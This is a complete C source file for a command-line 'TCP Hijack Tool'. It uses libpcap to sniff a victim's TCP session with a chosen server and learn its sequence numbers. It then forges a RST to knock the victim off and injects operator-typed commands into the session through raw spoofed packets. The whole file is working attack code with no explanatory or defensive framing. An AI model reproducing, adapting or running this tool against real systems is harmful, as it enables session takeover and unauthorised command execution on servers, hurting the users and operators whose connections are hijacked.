#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pcap.h>
#include <pthread.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <signal.h>
#include <time.h>

struct pseudo_tcp_header {
    u_int32_t source;
    u_int32_t dest;
    u_int8_t reserved;
    u_int8_t protocol;
    u_int16_t len;
};

struct target {
    u_int32_t src_ip, dst_ip;
    u_short src_port, dst_port;
    u_int32_t seq_num, ack_num;
    int hijacked;
    int sequence_captured;
    int packet_count; 
} tar;

#define MAX_COMMANDS 50
#define MAX_CMD_LENGTH 256
char command_list[MAX_COMMANDS][MAX_CMD_LENGTH];
int command_count = 0;

pcap_t *handle = NULL;
int attack_phase = 1;

unsigned short checksum(unsigned short *ptr, int nbytes) {
    register long sum = 0;
    unsigned short oddbyte;
    register short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (short)~sum;
}
void collect_commands() {
    printf("Enter commands to execute during hijacking (one per line)\n");
    printf("Press Enter on empty line to finish\n");
    
    char input[MAX_CMD_LENGTH];
    command_count = 0;
    
    while (command_count < MAX_COMMANDS) {
        printf("Command %d: ", command_count + 1);
        
        if (!fgets(input, sizeof(input), stdin)) {
            break;
        }
        
        input[strcspn(input, "\n")] = 0;
        
        if (strlen(input) == 0) {
            break; 
        }
        
        snprintf(command_list[command_count], MAX_CMD_LENGTH, "%s\n", input);
        command_count++;
    }
    
    if (command_count == 0) {
        printf("No commands entered\n");
        return;
    }
    
    
}

void send_rst_to_client() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) { 
        perror("socket"); 
        return; 
    }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    char packet[60];
    memset(packet, 0, sizeof(packet));

    struct iphdr *ip = (struct iphdr *)packet;
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    ip->id = htons(rand() % 65535);
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;
    ip->saddr = tar.dst_ip;
    ip->daddr = tar.src_ip;
    ip->check = 0;
    ip->check = checksum((unsigned short *)ip, sizeof(struct iphdr));

    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
    tcp->source = htons(tar.dst_port);
    tcp->dest = htons(tar.src_port);
    tcp->seq = htonl(tar.ack_num);
    tcp->ack_seq = 0;
    tcp->doff = 5;
    tcp->rst = 1;
    tcp->ack = 1;
    tcp->window = 0;
    tcp->check = 0;
    tcp->urg_ptr = 0;

    struct pseudo_tcp_header psh = {
        .source = ip->saddr,
        .dest = ip->daddr,
        .reserved = 0,
        .protocol = IPPROTO_TCP,
        .len = htons(sizeof(struct tcphdr))
    };

    char pseudo_packet[sizeof(psh) + sizeof(struct tcphdr)];
    memcpy(pseudo_packet, &psh, sizeof(psh));
    memcpy(pseudo_packet + sizeof(psh), tcp, sizeof(struct tcphdr));
    tcp->check = checksum((unsigned short *)pseudo_packet, sizeof(pseudo_packet));

    struct sockaddr_in sin = {
        .sin_family = AF_INET,
        .sin_addr.s_addr = tar.src_ip
    };

    sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
           (struct sockaddr *)&sin, sizeof(sin));
    close(sock);
    printf("RST sent to client\n");
}

void send_hijack_packet(const char *payload) {
    if (!payload || strlen(payload) == 0) {
        return;
    }

    int payload_len = strlen(payload);
    if (payload_len > 1400) {
        printf("payload too big\n");
        return;
    }

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("socket");
        return;
    }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    char packet[1500];
    memset(packet, 0, sizeof(packet));

    struct iphdr *ip = (struct iphdr *)packet;
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len);
    ip->id = htons(rand() % 65535);
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;
    ip->saddr = tar.src_ip;
    ip->daddr = tar.dst_ip;
    ip->check = 0;
    ip->check = checksum((unsigned short *)ip, sizeof(struct iphdr));

    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
    tcp->source = htons(tar.src_port);
    tcp->dest = htons(tar.dst_port);
    tcp->seq = htonl(tar.seq_num);
    tcp->ack_seq = htonl(tar.ack_num);
    tcp->doff = 5;
    tcp->psh = 1;
    tcp->ack = 1;
    tcp->window = htons(5840);
    tcp->check = 0;
    tcp->urg_ptr = 0;

    char *data = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);
    memcpy(data, payload, payload_len);

    struct pseudo_tcp_header psh = {
        .source = ip->saddr,
        .dest = ip->daddr,
        .reserved = 0,
        .protocol = IPPROTO_TCP,
        .len = htons(sizeof(struct tcphdr) + payload_len)
    };

    char pseudo_packet[sizeof(psh) + sizeof(struct tcphdr) + payload_len];
    memcpy(pseudo_packet, &psh, sizeof(psh));
    memcpy(pseudo_packet + sizeof(psh), tcp, sizeof(struct tcphdr));
    memcpy(pseudo_packet + sizeof(psh) + sizeof(struct tcphdr), payload, payload_len);
    tcp->check = checksum((unsigned short *)pseudo_packet, sizeof(pseudo_packet));

    struct sockaddr_in sin = {
        .sin_family = AF_INET,
        .sin_addr.s_addr = tar.dst_ip
    };

    int sent = sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len, 0,
                     (struct sockaddr *)&sin, sizeof(sin));

    if (sent > 0) {
        printf("sent command: %s", payload);
    }

    tar.seq_num += payload_len;
    close(sock);

}

void packet_handler(u_char *args, const struct pcap_pkthdr *hdr, const u_char *packet) {
    struct iphdr *ip = (struct iphdr *)(packet + 14);
    if (ip->protocol != IPPROTO_TCP) return;
    struct tcphdr *tcp = (struct tcphdr *)(packet + 14 + ip->ihl * 4);

    u_int32_t src_ip = ip->saddr;
    u_int32_t dst_ip = ip->daddr;
    u_short src_port = ntohs(tcp->source);
    u_short dst_port = ntohs(tcp->dest);
    u_int32_t seq = ntohl(tcp->seq);
    u_int32_t ack = ntohl(tcp->ack_seq);
    
    if (attack_phase == 1) {
        if (tar.src_port == 0) {
            if (src_ip == tar.src_ip && dst_ip == tar.dst_ip && dst_port == tar.dst_port) {
                tar.src_port = src_port;
                printf("found victim port: %s:%d -> %s:%d\n",
                       inet_ntoa(*(struct in_addr*)&tar.src_ip), tar.src_port,
                       inet_ntoa(*(struct in_addr*)&tar.dst_ip), tar.dst_port);
            }
            return;
        }
        
        if ((src_ip == tar.src_ip && dst_ip == tar.dst_ip && 
             src_port == tar.src_port && dst_port == tar.dst_port) ||
            (src_ip == tar.dst_ip && dst_ip == tar.src_ip && 
             src_port == tar.dst_port && dst_port == tar.src_port)) {
            
            tar.packet_count++;
            printf("packet count: %d\n", tar.packet_count);
        }
        
        if (src_ip == tar.dst_ip && dst_ip == tar.src_ip &&
            src_port == tar.dst_port && dst_port == tar.src_port && tcp->ack) {
            
            int ip_hl = ip->ihl * 4;
            int tcp_hl = tcp->doff * 4;
            int payload_len = ntohs(ip->tot_len) - ip_hl - tcp_hl;
            
            tar.ack_num = payload_len > 0 ? seq + payload_len : seq;
            printf("got server seq: %u\n", tar.ack_num);
        }
        
        if (src_ip == tar.src_ip && dst_ip == tar.dst_ip &&
            src_port == tar.src_port && dst_port == tar.dst_port) {
            
            int ip_hl = ip->ihl * 4;
            int tcp_hl = tcp->doff * 4;
            int payload_len = ntohs(ip->tot_len) - ip_hl - tcp_hl;
            
            tar.seq_num = seq + payload_len;
        }
        
        if (tar.seq_num > 0 && tar.ack_num > 0 && !tar.sequence_captured) {
            tar.sequence_captured = 1;
            attack_phase = 2;
        }
        return;
    }
    
    if (attack_phase == 2) {
        if ((src_ip == tar.src_ip && dst_ip == tar.dst_ip && 
             src_port == tar.src_port && dst_port == tar.dst_port) ||
            (src_ip == tar.dst_ip && dst_ip == tar.src_ip && 
             src_port == tar.dst_port && dst_port == tar.src_port)) {
            
            tar.packet_count++;
        }
        
        if (src_ip == tar.src_ip && dst_ip == tar.dst_ip &&
            src_port == tar.src_port && dst_port == tar.dst_port) {
            
            int ip_hl = ip->ihl * 4;
            int tcp_hl = tcp->doff * 4;
            int payload_len = ntohs(ip->tot_len) - ip_hl - tcp_hl;
            tar.seq_num = seq + payload_len;
        }
        
        if (src_ip == tar.dst_ip && dst_ip == tar.src_ip &&
            src_port == tar.dst_port && dst_port == tar.src_port) {
            
            int ip_hl = ip->ihl * 4;
            int tcp_hl = tcp->doff * 4;
            int payload_len = ntohs(ip->tot_len) - ip_hl - tcp_hl;
            tar.ack_num = payload_len > 0 ? seq + payload_len : seq;
        }
        
        if (tar.packet_count >= 5 && !tar.hijacked) {
            
            send_rst_to_client();
            usleep(100000); 
            
            for (int i = 0; i < command_count; i++) {
                
                send_hijack_packet(command_list[i]);
                
                if (i < command_count - 1) {
                    usleep(10000); 
                }
            }
            
            tar.hijacked = 1;
            printf("attack complete\n");
            pcap_breakloop(handle);
        }
        return;
    }
}


int main() {
    srand(time(NULL));
    
    char ipbuf[INET_ADDRSTRLEN];
    printf("TCP Hijack Tool\n");
    
    printf("victim IP: "); 
    fgets(ipbuf, sizeof(ipbuf), stdin);
    inet_pton(AF_INET, strtok(ipbuf, "\n"), &tar.src_ip);
    
    printf("server IP: "); 
    fgets(ipbuf, sizeof(ipbuf), stdin);
    inet_pton(AF_INET, strtok(ipbuf, "\n"), &tar.dst_ip);
    
    printf("server port: "); 
    scanf("%hu", &tar.dst_port); 
    getchar(); 

    if (tar.src_ip == 0 || tar.dst_ip == 0 || tar.dst_port == 0) {
        printf("invalid input\n");
        exit(1);
    }

    collect_commands();

    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live("eth0", 65536, 1, 1000, errbuf);
    if (!handle) {
        printf("pcap error: %s\n", errbuf);
        return 1;
    }


    char src_ip_str[INET_ADDRSTRLEN], dst_ip_str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &tar.src_ip, src_ip_str, INET_ADDRSTRLEN);
    inet_ntop(AF_INET, &tar.dst_ip, dst_ip_str, INET_ADDRSTRLEN);
    
    char filter[256];
    snprintf(filter, sizeof(filter),
             "tcp and host %s and host %s and port %d",
             src_ip_str, dst_ip_str, tar.dst_port);

    struct bpf_program fp;
    if (pcap_compile(handle, &fp, filter, 0, 0) == -1 || 
        pcap_setfilter(handle, &fp) == -1) {
        printf("filter error: %s\n", pcap_geterr(handle));
        pcap_close(handle);
        return 1;
    }

    
    printf("Waiting for victim to connect...\n\n");

    tar.src_port = 0;
    tar.seq_num = 0;
    tar.ack_num = 0;
    tar.hijacked = 0;
    tar.sequence_captured = 0;
    tar.packet_count = 0;

    pcap_loop(handle, 0, packet_handler, NULL);

    pcap_close(handle);
    
    printf("done\n");
    return 0;
}

